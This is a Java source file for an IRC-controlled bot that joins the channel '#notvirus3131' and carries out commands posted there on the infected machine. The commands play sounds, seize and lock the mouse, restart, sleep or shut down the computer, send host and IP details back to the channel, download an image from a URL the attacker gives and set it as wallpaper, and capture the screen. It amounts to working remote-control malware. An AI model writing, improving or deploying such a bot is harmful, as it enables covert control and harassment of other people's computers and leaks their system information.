import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;
import org.jibble.pircbot.PircBot;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.event.InputEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.*;
import java.util.Random;


public class IRCBot extends PircBot implements Runnable {

    private Thread lockMouse = null;
    private static volatile boolean neverEver = true;

    private String SystemName = null;
    private Sound sound = null;


    public static interface User32 extends Library {
        User32 INSTANCE = (User32) Native.loadLibrary("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);

        boolean SystemParametersInfo(int one, int two, String s, int three);
    }

    public IRCBot() {

        this.sound = new Sound();

        onConnect();

        if (!SystemName.isEmpty()) {
            setName(SystemName + new Random().nextInt(666));
        } else {

            setName("birisi" + new Random().nextInt(555));

        }


    }

    @Override
    protected void onConnect() {
        super.onConnect();

        try {
            SystemName = InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    protected void onQuit(String sourceNick, String sourceLogin, String sourceHostname, String reason) {
        super.onQuit(sourceNick, sourceLogin, sourceHostname, reason);

        sendMessage("#notvirus3131", reason);
    }

    @Override
    protected void onMessage(String channel, String sender, String login, String hostname, String message) {


        switch (message) {
            case "amogus":

                sound.setFile(0);
                sound.play();

                break;
            case "daddy":

                sound.setFile(1);
                sound.play();

                break;
            case "fear":

                sound.setFile(2);
                sound.play();

                break;
            case "ha":

                sound.setFile(3);
                sound.play();

                break;

            case "amogusl":

                sound.setFile(0);
                sound.play();
                sound.loop();


                break;
            case "daddyl":

                sound.setFile(1);
                sound.play();
                sound.loop();

                break;
            case "fearl":

                sound.setFile(2);
                sound.play();
                sound.loop();

                break;
            case "hal":

                sound.setFile(3);
                sound.play();
                sound.loop();


                break;
            case "stop":

                sound.stop();
                break;


        }


        if (message.startsWith("gocrazy")) {

            try {
                Robot robot = new Robot();
                for (int i = 0; i < 70; i++) {
                    Thread.sleep(150);
                    robot.mousePress(InputEvent.BUTTON1_MASK); // or 1 could be
                    robot.mousePress(InputEvent.BUTTON2_MASK); // or 2 could be and mouse locks itself untill you press middle button

                    robot.mouseMove(new Random().nextInt(840), new Random().nextInt(1280));
                }

            } catch (AWTException | InterruptedException e) {
                throw new RuntimeException(e);
            }

        }


        if (message.startsWith("restart")) {
            Runtime r = Runtime.getRuntime();
            try {
                r.exec("shutdown -r -t");
            } catch (IOException e) {
                System.out.println("Exception: " + e);
            }
        }

        if (message.startsWith("sleep")) {

            try {
                Runtime.getRuntime().exec("Rundll32.exe powrprof.dll,SetSuspendState Sleep");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        if (message.startsWith("shutdown")) {

            try {
                shutdown();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }


        if (message.startsWith("getip")) {

            try (final DatagramSocket socket = new DatagramSocket()) {
                socket.connect(InetAddress.getByName("8.8.8.8"), 10002);
                String ip = socket.getLocalAddress().getHostAddress();
                InetAddress inetAddress = Inet4Address.getLocalHost();
                InetAddress inetAddress1 = Inet4Address.getLoopbackAddress();

                sendMessage("#notvirus3131", "IPV adressi: " + inetAddress);
                sendMessage("#notvirus3131", "Loopback Adressi: " + inetAddress1);
                sendMessage("#notvirus3131", "Host Name:" + hostname.toLowerCase());

            } catch (UnknownHostException | SocketException e) {
                throw new RuntimeException(e);
            }


        }


        if (message.startsWith("background")) {

            String currentUsersHomeDir = System.getProperty("user.home");
            String otherFolder = currentUsersHomeDir + File.separator + "background.jpg";

            String url = message.split(" ")[1];
            try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());
                 FileOutputStream fileOutputStream = new FileOutputStream(otherFolder)) {
                byte dataBuffer[] = new byte[1024];
                int bytesRead;
                while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                    fileOutputStream.write(dataBuffer, 0, bytesRead);
                }
            } catch (IOException e) {
                // handle exception
            }


            User32.INSTANCE.SystemParametersInfo(0x0014, 0, otherFolder, 1);
        }


        if (message.equalsIgnoreCase("ss al")) {

            BufferedImage image = null;
            try {
                image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ImageIO.write(image, "png", new File("/screenshot.png"));

            } catch (AWTException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        }
        if (message.startsWith("lock")) {

            neverEver = true;
            setLockMouse();

        }
        if (message.startsWith("unlock")) {

            if (lockMouse.isAlive()) {
                neverEver = false;

            }


        }

    }

    private void shutdown() throws RuntimeException, IOException {
        String shutdownCommand;
        String operatingSystem = System.getProperty("os.name");

        if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
            shutdownCommand = "shutdown -h now";
        }
        // This will work on any version of windows including version 11
        else if (operatingSystem.contains("Windows")) {
            shutdownCommand = "shutdown.exe -s -t 0";
        } else {
            throw new RuntimeException("Unsupported operating system.");
        }

        Runtime.getRuntime().exec(shutdownCommand);
        System.exit(0);
    }


    private void setLockMouse() {

        lockMouse = new Thread(this);
        lockMouse.start();


    }

    @Override
    public void run() {
        try {
            Robot robot = new Robot();
            while (neverEver) {


                robot.mouseMove(750, 500 );

            }

        } catch (AWTException e) {
            throw new RuntimeException(e);
        }
    }


  /*  private int PosX() {

        PointerInfo pointerInfo = MouseInfo.getPointerInfo();
        Point point = pointerInfo.getLocation();
        Window grap = pointerInfo.getDevice().getFullScreenWindow();
        System.out.println(grap.toString());

        return point.x;

    }

    private int PoxY() {

        PointerInfo pointerInfo = MouseInfo.getPointerInfo();
        int memory = pointerInfo.getDevice().getAvailableAcceleratedMemory();
        GraphicsConfiguration[] grapCon = pointerInfo.getDevice().getConfigurations();
        Point realpoint = pointerInfo.getLocation();

        System.out.println("boş belleği: " + memory);
        for (GraphicsConfiguration configuration : grapCon){

            System.out.println(configuration);
        }


        return realpoint.y;
    }

   */
}
